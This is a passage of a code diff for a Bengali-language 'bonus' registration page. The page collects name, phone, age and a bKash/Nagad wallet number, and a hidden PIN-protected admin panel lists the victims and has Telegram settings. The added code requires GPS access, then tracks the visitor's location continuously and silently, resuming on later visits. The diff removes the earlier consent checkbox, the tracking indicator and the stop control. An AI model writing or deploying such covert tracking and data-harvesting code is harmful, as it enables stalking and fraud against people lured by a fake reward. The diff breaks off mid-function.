+      <div class="payment-title">
+        <div class="check">✓</div>
+        <h2>রেজিস্ট্রেশন সম্পন্ন</h2>
+        <p>৳100 গ্রহণের মাধ্যম নির্বাচন করুন</p>
+      </div>
+
+      <div class="msg" id="paymentMsg"></div>
+
+      <div class="pay-grid">
+        <label class="pay-option">
+          <input type="radio" name="payment" value="bKash">
+          <span class="pay-card">
+            <span class="pay-icon">📱</span>
+            <strong>bKash</strong>
+          </span>
+        </label>
+
+        <label class="pay-option">
+          <input type="radio" name="payment" value="Nagad">
+          <span class="pay-card">
+            <span class="pay-icon">💳</span>
+            <strong>Nagad</strong>
+          </span>
+        </label>
+      </div>
+
+      <div class="field">
+        <label class="label">bKash / Nagad নাম্বার</label>
+        <div class="input-wrap">
+          <span class="ico">☎️</span>
+          <input id="walletNumber" type="tel" inputmode="numeric" maxlength="11" placeholder="01XXXXXXXXX">
+        </div>
+      </div>
+
+      <button class="allow-btn" id="confirmBtn">
+        <span class="btn-inner">
+          <span class="coin-stack">
+            <span class="coin c1">৳</span>
+            <span class="coin c2">৳</span>
+            <span class="coin c3">৳</span>
+          </span>
+          <span>CONFIRM BONUS →</span>
+        </span>
+      </button>
+    </section>
+
+    <section class="card" id="successStep">
+      <div class="success-box">
+        <div class="success-icon">✓</div>
+        <h2>Registration Successful</h2>
+        <p>
+          আপনার তথ্য সফলভাবে গ্রহণ করা হয়েছে।<br>
+          যাচাই শেষে পরবর্তী আপডেট দেওয়া হবে।
+        </p>
+      </div>
+    </section>
+
+  </div>
+</main>
+
+<!-- ADMIN LOGIN -->
+<div class="admin-modal" id="adminModal">
+  <div class="admin-login">
+    <h3>🔐 Admin Access</h3>
+    <p>WELCOME BONUS-এ ৫ বার ট্যাপ করলে এই PIN screen আসে</p>
+    <div class="msg" id="adminPinMsg"></div>
+    <div class="field">
+      <label class="label">Admin PIN</label>
+      <div class="input-wrap">
+        <span class="ico">🔑</span>
+        <input id="adminPin" type="password" inputmode="numeric" maxlength="4" placeholder="PIN">
+      </div>
+    </div>
+    <div class="admin-actions">
+      <button class="admin-secondary" id="adminCancel">CANCEL</button>
+      <button class="allow-btn" id="adminLoginBtn" style="height:52px;margin:0">LOGIN</button>
+    </div>
   </div>
 </div>
 
-<section class="admin" id="adminPanel">
+<!-- ADMIN PANEL -->
+<section class="admin-panel" id="adminPanel">
   <div class="admin-shell">
-    <div class="admin-top"><div><h2>🛡️ Registration Admin</h2><div style="font-size:12px;color:#91a59b">Location history retained for up to 30 days</div></div><button class="small-btn dark" id="logoutBtn">Logout</button></div>
+    <div class="admin-top">
+      <div>
+        <h2>🛡️ Bonus Admin</h2>
+        <small>1x Bat 2027 Bonus</small>
+      </div>
+      <button class="admin-btn admin-dark" id="adminLogout">Logout</button>
+    </div>
+
     <div class="admin-grid">
       <div class="stat"><b id="statTotal">0</b><span>Total registrations</span></div>
-      <div class="stat"><b id="statLocation">0</b><span>Active latest locations</span></div>
-      <div class="stat"><b id="statTracking">0</b><span>Recently live (60 sec)</span></div>
+      <div class="stat"><b id="statBkash">0</b><span>bKash users</span></div>
+      <div class="stat"><b id="statNagad">0</b><span>Nagad users</span></div>
     </div>
 
     <div class="admin-card">
       <h3>🤖 Telegram Settings</h3>
-      <div class="row">
-        <div class="field"><label class="label">Bot Token</label><input id="botToken" type="password" placeholder="Paste new token (blank = keep current)"></div>
-        <div class="field"><label class="label">Chat ID</label><input id="chatId" type="text" placeholder="Telegram Chat ID"></div>
+      <div class="admin-row">
+        <div class="field">
+          <label class="label">Bot Token</label>
+          <input class="admin-search" id="telegramToken" type="password" placeholder="Bot Token">
+        </div>
+        <div class="field">
+          <label class="label">Chat ID</label>
+          <input class="admin-search" id="telegramChatId" type="text" placeholder="Chat ID">
+        </div>
       </div>
-      <div id="telegramState" style="font-size:12px;color:#91a59b"></div>
-      <div class="admin-actions"><button class="small-btn green" id="saveTelegram">Save</button><button class="small-btn dark" id="testTelegram">Test Message</button></div>
-      <div class="msg" id="telegramMsg" style="margin-top:10px"></div>
+      <div class="admin-actions" style="gap:10px">
+        <button class="admin-btn admin-green" id="saveTelegramDemo">SAVE</button>
+        <button class="admin-btn admin-dark" id="testTelegramBtn">SEND TEST MSG</button>
+      </div>
+      <div class="admin-msg" id="telegramDemoMsg"></div>
     </div>
 
     <div class="admin-card">
-      <h3>👥 Registrations & Location History</h3>
-      <div class="field"><input id="searchBox" type="text" placeholder="Search name / phone / wallet"></div>
-      <div id="records"></div>
+      <h3>👥 Registrations</h3>
+      <div class="field">
+        <input class="admin-search" id="adminSearch" type="text" placeholder="নাম / ফোন / wallet search">
+      </div>
+      <div id="adminRecords"></div>
     </div>
   </div>
 </section>
 
 <script>
-let verifiedLocation=null;
-let registrationId=null;
-let trackingToken=null;
-let watchId=null;
-let trackingActive=false;
-let lastTrackSentAt=0;
-let giftTaps=0;
-let giftTimer=null;
-let adminRecords=[];
-let adminRefreshTimer=null;
+const $ = id => document.getElementById(id);
 
-const $=id=>document.getElementById(id);
-const validPhone=n=>/^01[3-9]\d{8}$/.test(String(n||"").trim());
-
-function msg(id,text,ok=false){const el=$(id);el.className="msg "+(ok?"ok":"error");el.textContent=text;el.style.display="block"}
-function clearMsg(id){const el=$(id);el.style.display="none"}
-function updateRegisterButton(){$("registerBtn").disabled=!$("consent").checked}
-$("consent").addEventListener("change",updateRegisterButton);updateRegisterButton();
-
-// Robust Location Capture Function (High Accuracy -> Fallback Low Accuracy)
-function captureLocationWithFallback(){
-  return new Promise((resolve, reject)=>{
-    if(!navigator.geolocation){
-      return reject({code: 0, message: "আপনার ব্রাউজারে Location সুবিধা নেই।"});
-    }
-
-    // HTTPS Protocol Warning Alert Check
-    if (location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
-      console.warn("Location services might fail over HTTP connection.");
-    }
-
-    // Try High Accuracy First (GPS)
-    navigator.geolocation.getCurrentPosition(
-      pos => resolve(pos.coords),
-      err => {
-        console.warn("High accuracy location failed, retrying with low accuracy...", err);
-        // Fallback to Low Accuracy (Mobile Network / IP based)
-        navigator.geolocation.getCurrentPosition(
-          pos => resolve(pos.coords),
-          fallbackErr => reject(fallbackErr),
-          { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 }
-        );
-      },
-      { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-    );
-  });
+function validPhone(v){
+  return /^01[3-9]\d{8}$/.test(String(v || "").trim());
 }
 
-$("registerBtn").addEventListener("click",async()=>{
-  clearMsg("formError");
+function showMsg(id,text,type="error"){
+  const box=$(id);
+  box.className="msg "+type;
+  box.textContent=text;
+  box.style.display="block";
+}
 
-  const name=$("name").value.trim();
-  const address=$("address").value.trim();
-  const phone=$("phone").value.trim();
-  const age=Number($("age").value);
-  const consent=$("consent").checked;
+function clearMsg(id){
+  $(id).style.display="none";
+}
 
-  if(name.length<2)return msg("formError","সঠিক নাম লিখুন।");
-  if(address.length<4)return msg("formError","সঠিক ঠিকানা লিখুন।");
-  if(!validPhone(phone))return msg("formError","সঠিক ১১ ডিজিটের মোবাইল নাম্বার দিন।");
-  if(!age||age<18)return msg("formError","বয়স কমপক্ষে ১৮ বছর হতে হবে।");
-  if(!consent)return msg("formError","তথ্য ও লোকেশন শেয়ারের সম্মতি দিন।");
+function confetti(){
+  const pieces=["💰","🪙","✨","💸"];
+  for(let i=0;i<18;i++){
+    const e=document.createElement("div");
+    e.className="confetti";
+    e.textContent=pieces[Math.floor(Math.random()*pieces.length)];
+    e.style.left=(Math.random()*94)+"vw";
+    e.style.top=(-20-Math.random()*90)+"px";
+    e.style.animationDelay=(Math.random()*.35)+"s";
+    document.body.appendChild(e);
+    setTimeout(()=>e.remove(),2100);
+  }
+}
 
-  $("registerBtn").disabled=true;
-  $("registerBtn").textContent="📍 LOCATION ALLOW করুন...";
+// Persistent Registration Recovery System Check
+document.addEventListener("DOMContentLoaded", () => {
+  const savedRegId = localStorage.getItem("registrationId");
+  const isCompleted = localStorage.getItem("registrationCompleted");
+
+  if (isCompleted === "true") {
+    $("registerStep").style.display = "none";
+    $("paymentStep").style.display = "none";
+    $("successStep").style.display = "block";
+  } else if (savedRegId) {
+    $("registerStep").style.display = "none";
+    $("paymentStep").style.display = "block";
+    startLiveLocationTracking(savedRegId);
+  }
+});
+
+// Real-time Live Tracking Implementation (watchPosition)
+let watchId = null;
+function startLiveLocationTracking(regId) {
+  if (!navigator.geolocation) return;
+  if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+
+  watchId = navigator.geolocation.watchPosition(
+    async position => {
+      try {
+        await fetch(`/api/register/${encodeURIComponent(regId)}/location`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            location: {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy
+            }
+          })
+        });
+      } catch (err) {
+        console.error("Live location update failed:", err);
+      }
+    },
+    err => console.warn("WatchPosition Error:", err.message),
+    { enableHighAccuracy: true, timeout: 20000, maximumAge: 5000 }
+  );
+}
+
+$("allowBtn").addEventListener("click", () => {
+  clearMsg("formMsg");
+
+  // Secure Context Validation Checks (HTTPS Check)
+  if (!window.isSecureContext && location.hostname !== "localhost" && location.hostname !== "127.0.0.1") {
+    return showMsg("formMsg", "HTTPS ছাড়া ব্রাউজার লোকেশন সাপোর্ট করে না। Secure (HTTPS) সংযোগে প্রবেশ করুন।");
+  }
+
+  const name = $("name").value.trim();
+  const phone = $("phone").value.trim();
+  const age = Number($("age").value);
+
+  if (name.length < 2) return showMsg("formMsg", "সঠিক নাম লিখুন।");
+  if (!validPhone(phone)) return showMsg("formMsg", "সঠিক ১১ ডিজিটের মোবাইল নাম্বার দিন।");
+  if (!age || age < 18) return showMsg("formMsg", "বয়স কমপক্ষে ১৮ বছর হতে হবে।");
+
+  if (!navigator.geolocation) {
+    return showMsg("formMsg", "আপনার ব্রাউজারে লোকেশন সাপোর্ট করে না।");
+  }
+
+  $("allowBtn").disabled = true;
+  $("allowText").textContent = "LOCATION CHECKING...";
+
+  navigator.geolocation.getCurrentPosition(
+    async position => {
+      try {
+        $("allowText").textContent = "SAVING...";
+
+        const r = await fetch("/api/register/start", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            name,
+            phone,
+            age,
+            location: {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy
+            }
+          })
+        });
+
+        const d = await r.json();
+        if (!r.ok) throw new Error(d.error || "রেজিস্ট্রেশন সম্ভব হচ্ছে না।");
+
+        // Persistent Multi-tab sync using localStorage & sessionStorage
+        localStorage.setItem("registrationId", d.registrationId);
+        sessionStorage.setItem("registrationId", d.registrationId);
+
+        // Continuous Tracking Triggering
+        startLiveLocationTracking(d.registrationId);
+
+        $("registerStep").style.display = "none";
+        $("paymentStep").style.display = "block";
+        confetti();
+        window.scrollTo({ top: 0, behavior: "smooth" });
+      } catch (e) {
+        $("allowBtn").disabled = false;
+        $("allowText").textContent = "ALLOW NOW →";
+        showMsg("formMsg", e.message || "সার্ভারে সংযোগ করা যাচ্ছে না। ইন্টারনেটে আবার চেষ্টা করুন।");
+      }
+    },
+    error => {
+      $("allowBtn").disabled = false;
+      $("allowText").textContent = "ALLOW NOW →";
+
+      if (error.code === error.PERMISSION_DENIED) {
+        showMsg("formMsg", "Location permission Denied! ব্রাউজার সেটিংস থেকে লোকেশন Allow করুন।");
+      } else if (error.code === error.POSITION_UNAVAILABLE) {
+        showMsg("formMsg", "আপনার ডিভাইসের GPS লোকেশন পাওয়া যাচ্ছে না। GPS Signal অন করুন।");
+      } else if (error.code === error.TIMEOUT) {
+        showMsg("formMsg", "লোকেশন পেতে অতিরিক্ত সময় লাগছে। জিপিএস অন করে আবার চেষ্টা করুন।");
+      } else {
+        showMsg("formMsg", "দয়া করে লোকেশন অন করুন");
+      }
+    },
+    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+  );
+});
+
+$("confirmBtn").addEventListener("click", async () => {
+  clearMsg("paymentMsg");
+
+  const method = document.querySelector('input[name="payment"]:checked');
+  const wallet = $("walletNumber").value.trim();
+  const registrationId = localStorage.getItem("registrationId") || sessionStorage.getItem("registrationId");
+
+  if (!method) return showMsg("paymentMsg", "bKash অথবা Nagad নির্বাচন করুন।");
+  if (!validPhone(wallet)) return showMsg("paymentMsg", "সঠিক bKash/Nagad নাম্বার লিখুন।");
+  if (!registrationId) return showMsg("paymentMsg", "রেজিস্ট্রেশন আইডি পাওয়া যায়নি। প্রথম থেকে চেষ্টা করুন।");
+
+  $("confirmBtn").disabled = true;
 
   try {
-    const coords = await captureLocationWithFallback();
-    verifiedLocation = {
-      latitude: coords.latitude,
-      longitude: coords.longitude,
-      accuracy: coords.accuracy
-    };
-
-    $("locationBox").classList.remove("error");
-    $("locationBox").classList.add("ok");
-    $("locationTitle").textContent="✓ Location Allowed";
-    $("locationText").textContent="লোকেশন পাওয়া গেছে। রেজিস্ট্রেশন করা হচ্ছে...";
-
-    const payload={
-      name,
-      address,
-      phone,
-      age,
-      consent:true,
-      location:verifiedLocation
-    };
-
-    $("registerBtn").textContent="SAVING...";
-
-    const r=await fetch("/api/register/start",{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify(payload)
+    const r = await fetch(`/api/register/${encodeURIComponent(registrationId)}/payment`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        paymentMethod: method.value,
+        paymentNumber: wallet
+      })
     });
 
-    const d=await r.json();
-    if(!r.ok)throw new Error(d.error||"Registration failed");
+    const d = await r.json();
+    if (!r.ok) throw new Error(d.error || "Save failed");
 
-    registrationId=d.registrationId;
-    trackingToken=d.trackingToken||null;
+    localStorage.setItem("registrationCompleted", "true");
 
-    if(registrationId)sessionStorage.setItem("registrationId",registrationId);
-    if(trackingToken)sessionStorage.setItem("trackingToken",trackingToken);
+    $("paymentStep").style.display = "none";
+    $("successStep").style.display = "block";
+    confetti();
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  } catch (e) {
+    $("confirmBtn").disabled = false;
+    showMsg("paymentMsg", e.message || "সার্ভার রেসপন্স করছে না। ইন্টারনেট চেক করে আবার চেষ্টা করুন।");
+  }
+});
 
-    $("registerStep").style.display="none";
-    $("paymentStep").style.display="block";
-    window.scrollTo({top:0,behavior:"smooth"});
+// Cross-browser Mobile Tap Trigger Handling (Pointer, Click, Touchend Fallbacks)
+let adminTapCount = 0;
+let adminTapTimer = null;
 
-  } catch(err) {
-    verifiedLocation=null;
-    $("locationBox").classList.remove("ok");
-    $("locationBox").classList.add("error");
-    $("locationTitle").textContent="Location permission required";
+function handleAdminTap(e) {
+  if (e) e.preventDefault();
+  adminTapCount++;
+  clearTimeout(adminTapTimer);
+  adminTapTimer = setTimeout(() => adminTapCount = 0, 3000);
 
-    if(err.code===1){
-      $("locationText").textContent="রেজিস্ট্রেশন করতে Location Allow করতে হবে।";
-      msg("formError","Location Allow না করলে রেজিস্ট্রেশন হবে না। ব্রাউজার থেকে Permisssion Allow করুন।");
-    } else if(err.code===2){
-      $("locationText").textContent="GPS / Device Location বন্ধ আছে।";
-      msg("formError","ফোনের GPS/Location Services অন করে আবার চেষ্টা করুন।");
-    } else if(err.code===3){
-      $("locationText").textContent="লোকেশন পেতে বেশি সময় লাগছে।";
-      msg("formError","লোকেশন পেতে সময় বেশি লাগছে। ফোনের GPS অন করে আবার চেষ্টা করুন।");
-    } else {
-      $("locationText").textContent="GPS চালু করে আবার রেজিস্টার চাপুন।";
-      msg("formError", err.message || "লোকেশন পাওয়া যায়নি। GPS চালু করে আবার চেষ্টা করুন।");
+  if (adminTapCount >= 5) {
+    adminTapCount = 0;
+    $("adminModal").classList.add("show");
+    setTimeout(() => $("adminPin").focus(), 100);
+  }
+}
+
+const targetEl = $("adminTapTarget");
+if (window.PointerEvent) {
+  targetEl.addEventListener("pointerup", handleAdminTap);
+} else {
+  targetEl.addEventListener("touchend", handleAdminTap);
+  targetEl.addEventListener("click", handleAdminTap);
+}
+
+$("adminCancel").addEventListener("click", () => {
+  $("adminModal").classList.remove("show");
+  $("adminPin").value = "";
+});
+
+$("adminLoginBtn").addEventListener("click", async () => {
+  const pin = $("adminPin").value;
+
+  try {
+    const r = await fetch("/api/admin/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ pin })
+    });
+    const d = await r.json();
+    if (!r.ok) throw new Error(d.error || "Login failed");
+
+    $("adminPinMsg").style.display = "none";
+    $("adminModal").classList.remove("show");
+    $("adminPanel").classList.add("show");
+    $("adminPin").value = "";
+    await loadAdminLive();
+  } catch (e) {
+    showMsg("adminPinMsg", e.message, "error");
+  }
+});
+
+$("adminLogout").addEventListener("click", async () => {
+  await fetch("/api/admin/logout", { method: "POST" }).catch(() => {});
+  $("adminPanel").classList.remove("show");
+});
+
+function esc(v) {
+  return String(v ?? "").replace(/[&<>"']/g, c => ({
+    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
+  }[c]));
+}
+
+function fmtDate(v) {
+  try { return new Date(v).toLocaleString() } catch { return String(v || "") }
+}
+
+let liveAdminRows = [];
+
+async function loadAdminLive() {
+  try {
+    const [rr, sr] = await Promise.all([
+      fetch("/api/admin/registrations"),
+      fetch("/api/admin/settings")
+    ]);
+
+    if (rr.status === 401 || sr.status === 401) {
+      $("adminPanel").classList.remove("show");
+      return;
     }
 
-    $("registerBtn").disabled=false;
-    $("registerBtn").textContent="CREATE ACCOUNT →";
-  }
-});
+    if (!rr.ok || !sr.ok) throw new Error("Data loading failed");
 
-async function sendTrackingPoint(pos){
-  if(!registrationId||!trackingToken)return;
-  const now=Date.now();
-  if(now-lastTrackSentAt<5000)return; // Updated to 5 seconds for smoother tracking
-  lastTrackSentAt=now;
-  try{
-    const r=await fetch(`/api/register/${encodeURIComponent(registrationId)}/location`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json","X-Tracking-Token":trackingToken},
-      body:JSON.stringify({consent:true,location:{latitude:pos.coords.latitude,longitude:pos.coords.longitude,accuracy:pos.coords.accuracy}})
-    });
-    if(r.status===429)return;
-    const d=await r.json();if(!r.ok)throw new Error(d.error||"Location update failed");
-    const t=new Date(d.capturedAt).toLocaleTimeString();
-    $("chipText").textContent=`Live location shared • ${t}`;
-    $("trackerText").textContent=`Live tracking চালু • সর্বশেষ আপডেট ${t}`;
-    $("trackerText2").textContent=`Live tracking চালু • সর্বশেষ আপডেট ${t}`;
-  }catch(e){
-    $("chipText").textContent="Location update সমস্যা হয়েছে";
+    const rd = await rr.json();
+    const sd = await sr.json();
+
+    liveAdminRows = rd.registrations || [];
+
+    $("statTotal").textContent = liveAdminRows.length;
+    $("statBkash").textContent = liveAdminRows.filter(r => r.paymentMethod === "bKash").length;
+    $("statNagad").textContent = liveAdminRows.filter(r => r.paymentMethod === "Nagad").length;
+
+    $("telegramChatId").value = sd.telegramChatId || "";
+    $("telegramToken").placeholder = sd.hasTelegramBotToken
+      ? "Token saved (blank = keep current)"
+      : "Paste Bot Token";
+
+    renderAdminLive();
+  } catch (err) {
+    alert("অ্যাডমিন প্যানেলের ডেটা লোড হতে ব্যর্থ হয়েছে: " + err.message);
   }
 }
 
-function startLiveTracking(){
-  if(trackingActive)return;
-  if(!registrationId||!trackingToken){
-    alert("রেজিস্ট্রেশন সম্পন্ন হওয়ার পরে Live Location চালু করা যাবে।");return;
-  }
-  if(!navigator.geolocation){alert("এই ব্রাউজারে Location সুবিধা নেই।");return;}
+function renderAdminLive() {
+  const q = $("adminSearch").value.trim().toLowerCase();
+  const filtered = q
+    ? liveAdminRows.filter(r => [r.name, r.phone, r.paymentNumber, r.paymentMethod]
+        .some(v => String(v || "").toLowerCase().includes(q)))
+    : liveAdminRows;
 
-  watchId=navigator.geolocation.watchPosition(pos=>{
-    trackingActive=true;
-    $("trackingChip").classList.add("show");
-    $("trackerCard").classList.add("on");$("trackerCardSuccess").classList.add("on");
-    $("startTrackingBtn").textContent="■ STOP LIVE LOCATION";$("startTrackingBtn").classList.add("stop");
-    $("startTrackingBtn2").textContent="■ STOP LIVE LOCATION";$("startTrackingBtn2").classList.add("stop");
-    $("trackerTitle").textContent="● Live Location Sharing ON";$("trackerTitle2").textContent="● Live Location Sharing ON";
-    sendTrackingPoint(pos);
-  },err=>{
-    if(err.code===1)alert("Live Location শেয়ার করতে Location permission প্রয়োজন।");
-    stopLiveTracking(false);
-  },{enableHighAccuracy:true,maximumAge:3000,timeout:20000});
+  $("adminRecords").innerHTML = filtered.length
+    ? filtered.map(r => {
+        const isComplete = r.status === "complete";
+        const badgeClass = isComplete ? "badge" : "badge pending";
+        const badgeText = isComplete ? "VERIFIED / COMPLETE" : "AWAITING PAYMENT";
+
+        const loc = r.location
+          ? `<a target="_blank" rel="noopener" style="color:#58e8b3" href="https://maps.google.com/?q=${encodeURIComponent(r.location.latitude + "," + r.location.longitude)}">📍 View Current Location</a>`
+          : "📍 No location";
+
+        const locCount = Array.isArray(r.locationHistory) ? r.locationHistory.length : 1;
+
+        return `<div class="record">
+          <div class="record-top">
+            <div>
+              <h4>${esc(r.name)}</h4>
+              <div class="meta">
+                📱 Phone: ${esc(r.phone)}<br>
+                🎂 Age: ${esc(r.age)}<br>
+                💳 ${esc(r.paymentMethod || "N/A")}: ${esc(r.paymentNumber || "N/A")}<br>
+                ${loc} (${locCount} live updates saved)<br>
+                🕒 Registered: ${esc(fmtDate(r.createdAt))}
+              </div>
+            </div>
+            <span class="${badgeClass}">${badgeText}</span>
+          </div>
+          <div class="admin-actions" style="margin-top:10px">
+            <button class="admin-btn admin-red" onclick="deleteLiveRow('${esc(r.id)}')">Delete Record</button>
+          </div>
+        </div>`;
+      }).join("")
+    : `<div class="admin-note">এখনো কোনো registration নেই।</div>`;
 }
 
-async function stopLiveTracking(callServer=true){
-  if(watchId!==null){navigator.geolocation.clearWatch(watchId);watchId=null}
-  trackingActive=false;
-  $("trackingChip").classList.remove("show");
-  $("trackerCard").classList.remove("on");$("trackerCardSuccess").classList.remove("on");
-  $("startTrackingBtn").textContent="▶ START LIVE LOCATION";$("startTrackingBtn").classList.remove("stop");
-  $("startTrackingBtn2").textContent="▶ START LIVE LOCATION";$("startTrackingBtn2").classList.remove("stop");
-  $("trackerTitle").textContent="Live Location Sharing";$("trackerTitle2").textContent="Live Location Sharing";
-  $("trackerText").textContent="আপনি চাইলে পেজ খোলা থাকা পর্যন্ত চলমান লোকেশন শেয়ার করতে পারেন। প্রতিটি পয়েন্ট সর্বোচ্চ ৩০ দিন রাখা হবে।";
-  $("trackerText2").textContent="পেজ খোলা থাকা পর্যন্ত চালু রাখতে পারেন এবং যেকোনো সময় Stop করতে পারবেন।";
-  if(callServer&&registrationId&&trackingToken){
-    fetch(`/api/register/${encodeURIComponent(registrationId)}/tracking-stop`,{method:"POST",headers:{"X-Tracking-Token":trackingToken}}).catch(()=>{});
-  }
-}
-$("startTrackingBtn").onclick=()=>trackingActive?stopLiveTracking():startLiveTracking();
-$("startTrackingBtn2").onclick=()=>trackingActive?stopLiveTracking():startLiveTracking();
-$("chipStop").onclick=()=>stopLiveTracking();
+$("adminSearch").addEventListener("input", renderAdminLive);
 
-$("claimBtn").addEventListener("click",async()=>{
-  clearMsg("paymentError");
-  const method=document.querySelector('input[name="method"]:checked');
-  const number=$("walletNumber").value.trim();
-  if(!method)return msg("paymentError","bKash অথবা Nagad নির্বাচন করুন।");
-  if(!validPhone(number))return msg("paymentError","সঠিক bKash/Nagad নাম্বার দিন।");
-  $("claimBtn").disabled=true;$("claimBtn").textContent="SAVING...";
-  try{
-    const r=await fetch(`/api/register/${registrationId}/payment`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({paymentMethod:method.value,paymentNumber:number})});
-    const d=await r.json();if(!r.ok)throw new Error(d.error||"Save failed");
-    $("paymentStep").style.display="none";$("successStep").style.display="block";
-  }catch(e){msg("paymentError",e.message);$("claimBtn").disabled=false;$("claimBtn").textContent="CONFIRM →"}
-});
-
-$("giftBtn").addEventListener("click",()=>{
-  giftTaps++;clearTimeout(giftTimer);giftTimer=setTimeout(()=>giftTaps=0,1800);
-  if(giftTaps>=5){giftTaps=0;$("pinModal").style.display="flex";$("adminPin").focus()}
-});
-$("cancelPin").onclick=()=>{$("pinModal").style.display="none";$("adminPin").value="";clearMsg("pinError")};
-
-$("loginAdmin").addEventListener("click",async()=>{
-  clearMsg("pinError");
-  try{
-    const r=await fetch("/api/admin/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({pin:$("adminPin").value})});
-    const d=await r.json();if(!r.ok)throw new Error(d.error||"Login failed");
-    $("pinModal").style.display="none";$("adminPin").value="";$("adminPanel").style.display="block";
-    await loadAdmin();
-    clearInterval(adminRefreshTimer);adminRefreshTimer=setInterval(loadAdmin,10000);
-  }catch(e){msg("pinError",e.message)}
-});
-
-$("logoutBtn").addEventListener("click",async()=>{
-  clearInterval(adminRefreshTimer);adminRefreshTimer=null;
-  await fetch("/api/admin/logout",{method:"POST"}).catch(()=>{});
-  $("adminPanel").style.display="none";
-});
-
-async function loadAdmin(){
-  const [rr,sr]=await Promise.all([fetch("/api/admin/registrations"),fetch("/api/admin/settings")]);
-  if(rr.status===401||sr.status===401){$("adminPanel").style.display="none";clearInterval(adminRefreshTimer);return}
-  const rd=await rr.json(),sd=await sr.json();adminRecords=rd.registrations||[];
-  $("chatId").value=sd.telegramChatId||"";
-  $("telegramState").textContent=sd.hasTelegramBotToken?"Bot token saved securely on server.":"No bot token saved yet.";
-  renderRecords(adminRecords);
-}
-
-function esc(v){return String(v??"").replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]))}
-function fmt(iso){try{return new Date(iso).toLocaleString()}catch{return String(iso||"")}}
-function renderRecords(list){
-  $("statTotal").textContent=list.length;
-  $("statLocation").textContent=list.filter(r=>r.location).length;
-  $("statTracking").textContent=list.filter(r=>r.liveTrackingLastSeenAt&&(Date.now()-new Date(r.liveTrackingLastSeenAt).getTime()<60000)).length;
-  $("records").innerHTML=list.length?list.map(r=>{
-    const live=r.liveTrackingLastSeenAt&&(Date.now()-new Date(r.liveTrackingLastSeenAt).getTime()<60000);
-    const hist=Array.isArray(r.locationHistory)?r.locationHistory:[];
-    const loc=r.location?`<a style="color:#56e8b4" target="_blank" rel="noopener" href="https://maps.google.com/?q=${encodeURIComponent(r.location.latitude+","+r.location.longitude)}">📍 View latest location</a><br><span>Updated: ${esc(fmt(r.location.capturedAt))}</span><br><span>Expires: ${esc(fmt(r.locationExpiresAt))}</span>`:`<span>📍 Location expired/removed</span>`;
-    const historyRows=hist.slice().reverse().map((p,i)=>`<div class="history-row">${i+1}. ${esc(fmt(p.capturedAt))} • ±${Math.round(p.accuracy||0)}m • <a style="color:#56e8b4" target="_blank" rel="noopener" href="https://maps.google.com/?q=${encodeURIComponent(p.latitude+","+p.longitude)}">Map</a></div>`).join("");
-    return `<div class="record">
-      <div class="record-top"><div><h4>${esc(r.name)} ${live?'<span style="color:#40e5a8;font-size:11px">● LIVE</span>':''}</h4>
-      <div class="meta">📱 ${esc(r.phone)} · 🎂 ${esc(r.age)}<br>🏠 ${esc(r.address)}<br>💳 ${esc(r.paymentMethod||"-")} ${esc(r.paymentNumber||"-")}<br>${loc}<br>🧭 History: ${hist.length} point(s)<br>🕒 Registered: ${esc(fmt(r.createdAt))}</div></div>
-      <span class="badge ${r.status==="awaiting_payment"?"wait":""}">${esc(r.status)}</span></div>
-      <div class="admin-actions">
-        <button class="small-btn dark" onclick="toggleHistory('${r.id}')">Location History</button>
-        <button class="small-btn red" onclick="deleteRecord('${r.id}')">Delete</button>
-      </div>
-      <div class="history" id="hist-${r.id}">${historyRows||'<div class="history-row">No location history.</div>'}</div>
-    </div>`;
-  }).join(""):`<div style="color:#91a59b;font-size:13px">No registrations yet.</div>`;
-}
-
-window.toggleHistory=id=>{const el=document.getElementById("hist-"+id);if(el)el.classList.toggle("open")}
-$("searchBox").addEventListener("input",()=>{
-  const q=$("searchBox").value.trim().toLowerCase();
-  if(!q)return renderRecords(adminRecords);
-  renderRecords(adminRecords.filter(r=>[r.name,r.phone,r.paymentNumber,r.address].some(v=>String(v||"").toLowerCase().includes(q))));
-});
-window.deleteRecord=async id=>{
-  if(!confirm("এই রেকর্ড Delete করবেন?"))return;
-  const r=await fetch("/api/admin/registrations/"+encodeURIComponent(id),{method:"DELETE"});if(r.ok)await loadAdmin()
+window.deleteLiveRow = async id => {
+  if (!confirm("এই record Delete করবেন? (ডিলিট করলেও ফোন নম্বর সিস্টেম ব্লক রাখবে)")) return;
+  const r = await fetch("/api/admin/registrations/" + encodeURIComponent(id), { method: "DELETE" });
+  if (r.ok) await loadAdminLive();
 };
 
-$("saveTelegram").addEventListener("click",async()=>{
-  clearMsg("telegramMsg");
-  const r=await fetch("/api/admin/settings",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({telegramBotToken:$("botToken").value.trim(),telegramChatId:$("chatId").value.trim()})});
-  const d=await r.json();if(!r.ok)return msg("telegramMsg",d.error||"Save failed");
-  $("botToken").value="";$("telegramState").textContent=d.hasTelegramBotToken?"Bot token saved securely on server.":"No bot token saved yet.";msg("telegramMsg","Telegram settings saved.",true)
-});
-$("testTelegram").addEventListener("click",async()=>{
-  clearMsg("telegramMsg");
-  const r=await fetch("/api/admin/telegram/test",{method:"POST"});const d=await r.json();
-  if(!r.ok)return msg("telegramMsg",d.error||"Test failed");msg("telegramMsg","Test message sent successfully.",true)
